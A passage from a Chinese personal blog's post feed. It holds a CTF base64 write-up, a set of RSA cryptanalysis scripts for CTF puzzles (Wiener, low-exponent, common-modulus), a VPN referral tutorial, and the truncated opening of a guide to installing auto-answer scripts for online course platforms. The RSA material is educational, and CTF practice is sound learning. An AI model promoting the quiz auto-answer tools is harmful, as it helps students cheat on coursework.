html)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">    singer = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">    song = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;歌手: <span class="subst">&#123;singer&#125;</span>, 歌曲: <span class="subst">&#123;song&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到匹配项&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p><strong>输出</strong>:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">歌手: 齐秦, 歌曲: 往事随风</span><br></pre></td></tr></table></figure></div>

<p><strong>分析</strong>：<br>这个正则表达式的作用是：</p>
<ul>
<li><code>r&#39;&lt;li[^&gt;]*class=&quot;active&quot;[^&gt;]*&gt;</code> 匹配包含 <code>class=&quot;active&quot;</code> 的 <code>li</code> 元素。</li>
<li><code>.*?&lt;a[^&gt;]*singer=&quot;([^&quot;]*)&quot;[^&gt;]*&gt;</code> 用来捕获 <code>&lt;a&gt;</code> 标签中的 <code>singer</code> 属性（即歌手名）。</li>
<li><code>(.*?)&lt;/a&gt;</code> 捕获 <code>&lt;a&gt;</code> 标签中的歌曲名。</li>
</ul>
</li>
</ol>
<h2 id="数据分析之matplotlib"><a href="#数据分析之matplotlib" class="headerlink" title="数据分析之matplotlib"></a>数据分析之matplotlib</h2>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>QFNUCTF（日照）-Reverse-writeup</title>
    <url>/posts/44b69183.html</url>
    <content><![CDATA[<h1 id="base64"><a href="#base64" class="headerlink" title="base64++"></a>base64++</h1><h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://z1.ax1x.com/2023/10/13/piSzYQ0.png"
                      alt="查壳"
                ></p>
<p>无壳</p>
<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://z1.ax1x.com/2023/10/13/piSzGzq.png"
                      alt="反编译查看字串"
                ></p>
<p>查看字串，有两个比较特殊的字符串</p>
<p>联想到题目是换表base64</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://z1.ax1x.com/2023/10/13/piSz3Js.png"
                      alt="换表"
                ></p>
<h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>滚去<a class="link"   href="https://ctf.mzy0.com/CyberChef3/" >https://ctf.mzy0.com/CyberChef3/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>    解密一下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://z1.ax1x.com/2023/10/13/piSz8Wn.png"
                      alt="解密"
                ></p>
<h2 id="题后工作"><a href="#题后工作" class="headerlink" title="题后工作"></a>题后工作</h2><p>解密出来后面带着LQB，一开始我以为我做错了，后来我把文件拉进kali运行了一下</p>
<p>发现这个字符串<code>flag&#123;6JOd5qGl5p2v5Yqg5rK5&#125;LQB</code>是无法通过正常验证的</p>
<p>而去掉LQB之后<code>flag&#123;6JOd5qGl5p2v5Yqg5rK5&#125;</code>是正常验证的</p>
<p>所以我去掉之后提交，但还是没有通过</p>
<p></br></br></br></p>
<p>无奈之下我放弃这个题了</p>
</br>

<p>就在前几天我找到了出题人，问了问情况，发现程序里是有一段添加字符串<code>LQB</code>的代码的，所以输出结果带着LQB没错，我的做题思路也没错</p>
<p>提交失败的原因是，后台正确的flag中的1和正确答案的l混了，我联系出题人修改了bug</p>
<p>解题结束！</p>
<h1 id="XOR（修改）"><a href="#XOR（修改）" class="headerlink" title="XOR（修改）"></a>XOR（修改）</h1><h2 id="查壳-1"><a href="#查壳-1" class="headerlink" title="查壳"></a>查壳</h2><p>等会吧，明天再写，累了</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
        <category>QFNUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA的一些解密脚本</title>
    <url>/posts/10f5a405.html</url>
    <content><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>1.<a href="#1.%E5%B7%B2%E7%9F%A5(p,q,e),%E6%B1%82d">已知(p,q,e),求d</a></p>
<p>2.<a href="#2.%E5%B7%B2%E7%9F%A5(p,q,e,c)%EF%BC%8C%E6%B1%82m">已知(p,q,e,c)，求m</a></p>
<p>3.<a href="#3.%E5%B7%B2%E7%9F%A5(p,q,dp,dq,c)%EF%BC%8C%E6%B1%82m">已知(p,q,dp,dq,c)，求m</a></p>
<p>4.<a href="#4.%E5%B7%B2%E7%9F%A5(e,dp,n,c)%EF%BC%8C%E6%B1%82m">已知(e,dp,n,c)，求m</a></p>
<p>5.<a href="#5.%E5%B7%B2%E7%9F%A5(n,e1,e2,c1,c2)%EF%BC%8C%E6%B1%82m">已知(n,e1,e2,c1,c2)，求m</a></p>
<p>6.<a href="#6.%E5%B7%B2%E7%9F%A5(e,n1,c1,n2,c2)%EF%BC%8C%E6%B1%82m">已知(e,n1,c1,n2,c2)，求m</a></p>
<p>7.<a href="#7.%E5%B7%B2%E7%9F%A5(p+q,p-q,e,c)%EF%BC%8C%E6%B1%82m">已知(p+q,p-q,e,c)，求m</a></p>
<p>8.<a href="#8.%E5%B7%B2%E7%9F%A5(e,n,c)%EF%BC%8C%E6%B1%82m">已知(e,n,c)，求m</a></p>
<p>9.<a href="#9.%E5%B7%B2%E7%9F%A5(e,n,c)%EF%BC%8C%E6%B1%82m%EF%BC%88e%E6%9E%81%E5%B0%8F%EF%BC%8C%E5%A6%823%EF%BC%8C%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E6%94%BB%E5%87%BB%EF%BC%89">已知(e,n,c)，求m（e极小，如3，低加密指数攻击）</a></p>
<p>10.<a href="#10.%E5%B7%B2%E7%9F%A5(e,n,c)%EF%BC%8C%E6%B1%82m%EF%BC%88e%E5%BE%88%E5%A4%A7%EF%BC%8C%E4%BD%8E%E8%A7%A3%E5%AF%86%E6%8C%87%E6%95%B0%E6%94%BB%E5%87%BB%EF%BC%89">已知(e,n,c)，求m（e很大，低解密指数攻击）</a></p>
<p>11.<a href="#11.%E5%B7%B2%E7%9F%A5%EF%BC%88c,n,p%EF%BC%88q-1%EF%BC%89,q*%EF%BC%88p-1%EF%BC%89%EF%BC%89%EF%BC%8C%E6%B1%82m">已知(c,n,p(q-1),q(p-1))，求m</a></p>
<p>参考：<a class="link"   href="http://t.csdnimg.cn/YEnxe" >CTF中关于RSA的常见题型_abtgu的博客-CSDN博客_ctf rsa题目<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><strong>1、RSA算法需要的基础知识：</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Crypto-RSA/e919d28a04e3408dadf817f324a9a3d8.png"
                      alt="img"
                ></p>
<p>（5）判断互质数：	</p>
<p>1）两个质数一定是互质数。</p>
<p>2）一个质数如果不能整除另一个合数（合数是指在大于1的整数中除了能被1和本身整除外，还能被其他数（0除外）整除的数），这两个数为互质数。例如，3与10、5与 26。</p>
<p>3）1不是质数也不是合数，它和任何一个自然数在一起都是互质数。</p>
<p>4）相邻的两个自然数是互质数。如 15与16。</p>
<p>5）相邻的两个奇数是互质数。如 49与 51。</p>
<p>6）大数是质数的两个数是互质数。如97与88。</p>
<p>7）小数是质数，大数不是小数的倍数的两个数是互质数。如 7和16。</p>
<p>8）两个数都是合数（二数差又较大），小数所有的质因数，都不是大数的约数（因数），这两个数是互质数。如357与715，357&#x3D;3×7×17，而3、7和17都不是715的约数，这两个数为互质数。</p>
<p>等等。。。</p>
<p>（6）什么是模运算与模指数运算？</p>
<p>模运算是整数运算，有一个整数m，以n为模做模运算，即m mod n。让m被n整除，只取所得的余数作为结果，就叫做模运算。例如，10 mod 3&#x3D;1；26 mod 6&#x3D;2；28 mod 2 &#x3D;0等等。</p>
<p>模指数运算就是先做指数运算，取其结果再做模运算。如(5^3) mod 7 &#x3D; (125 mod 7) &#x3D; 6。</p>
<p><strong>2、RSA加解密</strong></p>
<p>（1）RSA加密算法由五个部分组成：</p>
<p>原文(Message)、密文(Ciphertext)、公钥(Public Key)、私钥(Secret Key)、加密算法(Encryption)、解密算法(Decryption)。</p>
<p>（2）RSA求公钥私钥步骤如下：</p>
<p>1）随机选择两个不相同的素数 p,q 。</p>
<p>2）将p,q相乘，记为 n &#x3D; p × q 。</p>
<p>3）计算n的欧拉函数φ(n)，当p,q为不相同的素数时，φ(n)&#x3D;(p−1)(q−1)。</p>
<p>4）随机选择一个整数e，满足两个条件：φ(n)与e互质，且 1 &lt; e &lt;φ(n)。</p>
<p>5）计算e对于φ(n)的模反元素d，也就是说找到一个d满足ed &#x3D; 1modφ(n)。这个式子等价于ed &#x3D; kφ(n) + 1，实际上就是对于方程ed − kφ(n) &#x3D; 1求(d,k)的整数解。这个方程可以用扩展欧几里得算法求解。</p>
<p>6）最终把(e,n)封装成公钥，(d,n)封装成私钥。</p>
<p>（3）RSA加密与解密</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Crypto-RSA/70a02a11bade4ecd8cb39dc976de7669.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Crypto-RSA/934d5831addc4e1bbdf45d0b7c43d937.png"
                      alt="img"
                ></p>
<p>（4）RSA算法的破解</p>
<p>1）由于公钥中n已知，只需计算出d，便可通过M&#x3D;Cd mod n计算出明文M。</p>
<p>2）由于方程ed − kφ(n) &#x3D; 1，公钥中e已知，我们只需要知道φ(n)的值便可求出(d,k)的整数解。</p>
<p>3）由于φ(n) &#x3D; （p - 1）(q - 1)，我们需要求出p，q的值。</p>
<p>4）由于n &#x3D; p  q，我们需要对n做因数分解。</p>
<p>只要n可以被因数分解为p，q，我们便可反推破解私钥，从而破解密文。</p>
<hr>
<h4 id="1-已知-p-q-e-求d"><a href="#1-已知-p-q-e-求d" class="headerlink" title="1.已知(p,q,e),求d"></a>1.已知(p,q,e),求d</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">e = </span><br><span class="line">phi = (p-1)(q-1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure></div>

<h4 id="2-已知-p-q-e-c-，求m"><a href="#2-已知-p-q-e-c-，求m" class="headerlink" title="2.已知(p,q,e,c)，求m"></a>2.已知(p,q,e,c)，求m</h4><p>密文c，明文m</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2 </span><br><span class="line">import binascii</span><br><span class="line"> </span><br><span class="line">c = </span><br><span class="line">e =  </span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line"> </span><br><span class="line"># 计算私钥 d</span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"> </span><br><span class="line"># 解密 m</span><br><span class="line">m = gmpy2.powmod(c,d,p*q)</span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure></div>

<h4 id="3-已知-p-q-dp-dq-c-，求m"><a href="#3-已知-p-q-dp-dq-c-，求m" class="headerlink" title="3.已知(p,q,dp,dq,c)，求m"></a>3.已知(p,q,dp,dq,c)，求m</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Crypto-RSA/c13f4126471c460e9566e37a4e5f77ac.png"
                      alt="img"
                ></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">p =</span><br><span class="line">q =</span><br><span class="line">dp =</span><br><span class="line">dq =</span><br><span class="line">c =</span><br><span class="line"> </span><br><span class="line">I = gmpy2.invert(p,q)</span><br><span class="line">mp = gmpy2.powmod(c,dp,p)</span><br><span class="line">mq = gmpy2.powmod(c,dq,q)</span><br><span class="line"> </span><br><span class="line">m = ((I*(mp-mq))%q)*p+mp</span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure></div>

<h4 id="4-已知-e-dp-n-c-，求m"><a href="#4-已知-e-dp-n-c-，求m" class="headerlink" title="4.已知(e,dp,n,c)，求m"></a>4.已知(e,dp,n,c)，求m</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Crypto-RSA/60178e8906e54a9b99bb29ec355f5ee9.png"
                      alt="img"
                ></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">e = </span><br><span class="line">n =</span><br><span class="line">dp =</span><br><span class="line">c =</span><br><span class="line">for i in range(1,e):</span><br><span class="line">    if (e*dp-1)%i == 0 and n%((e*dp-1)//i+1)==0:</span><br><span class="line">        q = n//((e*dp-1)//i+1)</span><br><span class="line">        phi = (q-1)*((e*dp-1)//i)</span><br><span class="line">        d = gmpy2.invert(e,phi)</span><br><span class="line">        m = gmpy2.powmod(c,d,n)</span><br><span class="line"> </span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure></div>

<h4 id="5-已知-n-e1-e2-c1-c2-，求m"><a href="#5-已知-n-e1-e2-c1-c2-，求m" class="headerlink" title="5.已知(n,e1,e2,c1,c2)，求m"></a>5.已知(n,e1,e2,c1,c2)，求m</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Crypto-RSA/358a70c21c954c42bb1f180851d998aa.png"
                      alt="img"
                ></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line"> </span><br><span class="line">n =</span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">e1 = </span><br><span class="line">e2 = </span><br><span class="line"> </span><br><span class="line">s = gmpy2.gcdext(e1,e2)</span><br><span class="line">a = s[1]</span><br><span class="line">b = s[2]</span><br><span class="line"> </span><br><span class="line">if a&lt;0:</span><br><span class="line">    a = -a</span><br><span class="line">    c1 = gmpy2.invert(c1,n)</span><br><span class="line">else:</span><br><span class="line">    b = -b</span><br><span class="line">    c2 = gmpy2.invert(c2,n)</span><br><span class="line"> </span><br><span class="line">m = (gmpy2.powmod(c1,a,n)*gmpy2.powmod(c2,b,n))%n</span><br><span class="line"> </span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure></div>

<h4 id="6-已知-e-n1-c1-n2-c2-，求m"><a href="#6-已知-e-n1-c1-n2-c2-，求m" class="headerlink" title="6.已知(e,n1,c1,n2,c2)，求m"></a>6.已知(e,n1,c1,n2,c2)，求m</h4><p><strong>解题思路：</strong> 两组数中e相同，n，c不同，求出n1与n2的最大公因数即为p，之后就可以得到q和d，从而求解m。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line"> </span><br><span class="line">e = </span><br><span class="line">n1 = </span><br><span class="line">c1 = </span><br><span class="line">n2 = </span><br><span class="line">c2 = </span><br><span class="line"> </span><br><span class="line">p1 = gmpy2.gcd(n1,n2)</span><br><span class="line">q1 = n1 // p1</span><br><span class="line">phi1 = (p1-1)*(q1-1)</span><br><span class="line"> </span><br><span class="line">d1 = gmpy2.invert(e,phi1)</span><br><span class="line">m1 = gmpy2.powmod(c1,d1,n1)</span><br><span class="line"> </span><br><span class="line">print(binascii.unhexlify(hex(m1)[2:]))</span><br><span class="line"> </span><br><span class="line">p2 = gmpy2.gcd(n2,n1)</span><br><span class="line">q2 = n2 // p2</span><br><span class="line">phi2 = (p2-1)*(q2-1)</span><br><span class="line"> </span><br><span class="line">d2 = gmpy2.invert(e,phi2)</span><br><span class="line">m2 = gmpy2.powmod(c2,d2,n2)</span><br><span class="line"> </span><br><span class="line">print(binascii.unhexlify(hex(m2)[2:]))</span><br></pre></td></tr></table></figure></div>

<h4 id="7-已知-p-q-p-q-e-c-，求m"><a href="#7-已知-p-q-p-q-e-c-，求m" class="headerlink" title="7.已知(p+q,p-q,e,c)，求m"></a>7.已知(p+q,p-q,e,c)，求m</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">e=</span><br><span class="line">a=</span><br><span class="line">b=</span><br><span class="line">c=</span><br><span class="line"> </span><br><span class="line">p = (a+b)//2</span><br><span class="line">q = (a-b)//2</span><br><span class="line"> </span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"> </span><br><span class="line">m = gmpy2.powmod(c,d,p*q)</span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br><span class="line"> </span><br></pre></td></tr></table></figure></div>

<h4 id="8-已知-e-n-c-，求m"><a href="#8-已知-e-n-c-，求m" class="headerlink" title="8.已知(e,n,c)，求m"></a>8.已知(e,n,c)，求m</h4><p>解题思路：<br>可以分解n得到p,q</p>
<p>在线分解大整数网址:</p>
<p><a class="link"   href="http://www.factordb.com/index.php" >http://www.factordb.com/index.php<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>分解质因数工具 - 整数分解最多为70位</p>
<p>注意：在factordb中因为数过大而显示不全时，可以点击show查看完整数据，但是在复制数据时注意它的每一行都有空格，粘贴后要去掉</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Crypto-RSA/9d7aa499bad5423189ad31ed01ab5267.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Crypto-RSA/b8f526c4255340a69671d2c54e87fd69.png"
                      alt="img"
                ></p>
<p>若以上都不好用，则用yafu计算</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line"> </span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line"> </span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = gmpy2.powmod(c,d,n)</span><br><span class="line"> </span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))	</span><br></pre></td></tr></table></figure></div>

<h4 id="9-已知-e-n-c-，求m（e极小，如3，低加密指数攻击）"><a href="#9-已知-e-n-c-，求m（e极小，如3，低加密指数攻击）" class="headerlink" title="9.已知(e,n,c)，求m（e极小，如3，低加密指数攻击）"></a>9.已知(e,n,c)，求m（e极小，如3，低加密指数攻击）</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Crypto-RSA/a1c0f87f74c947a2a051aaad34821155.png"
                      alt="img"
                ></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line"> </span><br><span class="line">e =</span><br><span class="line">n =</span><br><span class="line">c =</span><br><span class="line"> </span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    if gmpy2.iroot((c+i*n),3)[1] == True:</span><br><span class="line">        m = gmpy2.iroot((c+i*n),3)[0]</span><br><span class="line">        break</span><br><span class="line">    i += 1</span><br><span class="line"> </span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure></div>

<h4 id="10-已知-e-n-c-，求m（e很大，低解密指数攻击）"><a href="#10-已知-e-n-c-，求m（e很大，低解密指数攻击）" class="headerlink" title="10.已知(e,n,c)，求m（e很大，低解密指数攻击）"></a>10.已知(e,n,c)，求m（e很大，低解密指数攻击）</h4><p><strong>解题思路：</strong> 题中e很大，故可知是<strong>低解密指数攻击</strong>。</p>
<p>可以使用破解脚本：求出d的值，文件下载地址<a class="link"   href="https://gitcode.com/mirrors/pablocelayes/rsa-wiener-attack/overview?utm_source=csdn_github_accelerator" >GitHub - pablocelayes&#x2F;rsa-wiener-attack: A Python implementation of the Wiener attack on RSA public-key encryption scheme.<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>（注意，这里要将破解脚本和rsa-wiener-attack的py文件放在同一个目录下）</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">import RSAwienerHacker</span><br><span class="line"> </span><br><span class="line">e =</span><br><span class="line">n =</span><br><span class="line">c =</span><br><span class="line"> </span><br><span class="line">d = RSAwienerHacker.hack_RSA(e,n)</span><br><span class="line">m = gmpy2.powmod(c,d,n)</span><br><span class="line"> </span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br><span class="line"> </span><br></pre></td></tr></table></figure></div>

<h4 id="11-已知（c-n-p（q-1）-q-（p-1）），求m"><a href="#11-已知（c-n-p（q-1）-q-（p-1）），求m" class="headerlink" title="11.已知（c,n,p（q-1）,q*（p-1）），求m"></a>11.已知（c,n,p（q-1）,q*（p-1）），求m</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">#pq = p*(q-1)</span><br><span class="line">#qp = q*(p-1)</span><br><span class="line">c= </span><br><span class="line">n= </span><br><span class="line">pq= </span><br><span class="line">qp= </span><br><span class="line"> </span><br><span class="line">e = 65537</span><br><span class="line">p = n - pq</span><br><span class="line">q = n - qp</span><br><span class="line">phi = (p - 1)*(q - 1)</span><br><span class="line"> </span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = gmpy2.powmod(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"> </span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Sakuracat注册使用教程</title>
    <url>/posts/80f8b1da.html</url>
    <content><![CDATA[<h1 id="Sakuracat注册使用教程"><a href="#Sakuracat注册使用教程" class="headerlink" title="Sakuracat注册使用教程"></a>Sakuracat注册使用教程</h1><h2 id="爬墙工具的介绍和安装使用"><a href="#爬墙工具的介绍和安装使用" class="headerlink" title="爬墙工具的介绍和安装使用"></a>爬墙工具的介绍和安装使用</h2><h3 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h3><p><font color="#FF3333"> 这些你都不需要记，看看就行 </font></p>
<ul>
<li><p>虚拟专用网络(Virtual Private Network，VPN)是专用网络的延伸，它包含了类似 Internet 的共享或公共网络链接。通过 VPN 可以以模拟点对点专用链接的方式通过共享或公共网络在两台计算机之间发送数据。</p>
</li>
<li><p>如果说得再通俗一点，VPN 实际上是 “线路中的线路”，类型于城市大道上的 “公交专用线”，所不同的是，由 VPN 组成的 “线路” 并不是物理存在的，而是通过技术手段模拟出来，即是 “虚拟” 的。不过，这种虚拟的专用网络技术却可以在一条公用线路中为两台计算机建立一个逻辑上的专用 “通道”，它具有良好的保密和不受干扰性，使双方能进行自由而安全的点对点连接，因此被网络管理员们非常广泛地关注着。</p>
</li>
<li><p>通过虚拟专用网，我们在家就可以轻松安全的登录到公司的内部网络上，这样可以实现我们在家办公的梦想了。</p>
</li>
</ul>
<h3 id="账号注册"><a href="#账号注册" class="headerlink" title="账号注册"></a>账号注册</h3><p><span style="border:1px solid #FF007F;"> 本人不对此工具处理任何售后，有使用问题请找他们官网售后 </span></p>
<p>有了这个工具，你不只是能进 ai，还可以高速浏览 GitHub 等网站，以及…………</p>
<p>点击下方任意链接跳转注册界面↓（有进不去的换一个）</p>
<ul>
<li><a class="link"   href="https://sakuracat.shop/register?code=Fo7cS2WA" >链接 1<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://sakuracat-cdn02.com/register?code=Fo7cS2WA" >链接 2<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://sakuracat-cdn01.com/register?code=Fo7cS2WA" >链接 3<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://sakuracat-004.com/register?code=Fo7cS2WA" >链接 4<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://sakuracat-003.com/register?code=Fo7cS2WA" >链接 5<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://sakuracat-b.com/register?code=Fo7cS2WA" >链接 6<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://sakuracat-a.com/register?code=Fo7cS2WA" >链接 7<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<p>输入邮箱密码注册账号，注册完成后登陆</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E6%B3%A8%E5%86%8C%E8%B4%A6%E5%8F%B7.png"
                      alt="注册"
                ></p>
<p>然后点击左侧购买订阅</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E8%AE%A2%E9%98%85.png"
                      alt="订阅"
                ></p>
<p>根据需求选择你合适的方案，如果你只是想尝鲜的话，毫无疑问，选最便宜的，能用就行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E8%B4%AD%E4%B9%B0%E8%AE%A2%E9%98%85.png"
                      alt="购买订阅"
                ></p>
<p>我本人用的是 <font color="#FF0000"> 38.8 巨量不限时，推荐这个 </font>，大约可以用 2 年左右，平均下来大约 0.06&#x2F;天，而且是实打实的买多少用多少，不会出现超时浪费</p>
<p>买完之后点击左上方仪表盘可以看到你的已订阅</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E4%BB%AA%E8%A1%A8%E7%9B%98.png"
                      alt="仪表盘"
                ></p>
<p>然后点击仪表盘下方的使用文档</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E5%AE%A2%E6%88%B7%E7%AB%AF.png"
                      alt="客户端安装"
                ></p>
<p>选择你的系统安装客户端</p>
<p>安装完之后登陆客户端就可以看到这样</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E5%AE%89%E8%A3%85%E5%AE%8C%E6%88%90.png"
                      alt="安装完成"
                ></p>
<h3 id="连接节点"><a href="#连接节点" class="headerlink" title="连接节点"></a>连接节点</h3><p>目前为止已经基本结束了，点击连接，点进去选个绿色的节点，点全局，<font color="#FF0000"> 如果后续出现连接失败就换个节点 </font></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E8%8A%82%E7%82%B9.png"
                      alt="节点"
                ></p>
]]></content>
      <categories>
        <category>技术教程</category>
      </categories>
      <tags>
        <tag>ChatGPT</tag>
        <tag>AI</tag>
        <tag>Sakuracat</tag>
      </tags>
  </entry>
  <entry>
    <title>U校园/Welearn/智慧树/雨课堂/学习通/问卷星/腾讯问卷等196平台自动答题通杀脚本的安装教程</title>
    <url>/posts/1ff200e1.html</url>
    <content><![CDATA[<h1 id="U-校园-Welearn-智慧树-雨课堂-学习通-问卷星-腾讯问卷等-196-平台自动答题通杀脚本的安装教程"><a href="#U-校园-Welearn-智慧树-雨课堂-学习通-问卷星-腾讯问卷等-196-平台自动答题通杀脚本的安装教程" class="headerlink" title="U 校园&#x2F;Welearn&#x2F;智慧树&#x2F;雨课堂&#x2F;学习通&#x2F;问卷星&#x2F;腾讯问卷等 196 平台自动答题通杀脚本的安装教程"></a>U 校园&#x2F;Welearn&#x2F;智慧树&#x2F;雨课堂&#x2F;学习通&#x2F;问卷星&#x2F;腾讯问卷等 196 平台自动答题通杀脚本的安装教程</h1><blockquote>
<p>本教程旨在帮助你节省时间，去做有意义的事情，切勿因小失大，工具是为了进步，而不是偷懒！！！！！！！</p>
<p>脚本有概率无法做，非选择填空题，如连线题，图片题等</p>
<p><span style="background:#00FFFF;"> 图片加载较慢请用浏览器打开本网址 </span></p>
</blockquote>
<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><ol>
<li>本刷题脚本仅供个人学习和研究之用，任何商业用途均不被允许。用户在使用本脚本时，应遵守所在国家或地区的法律法规。</li>
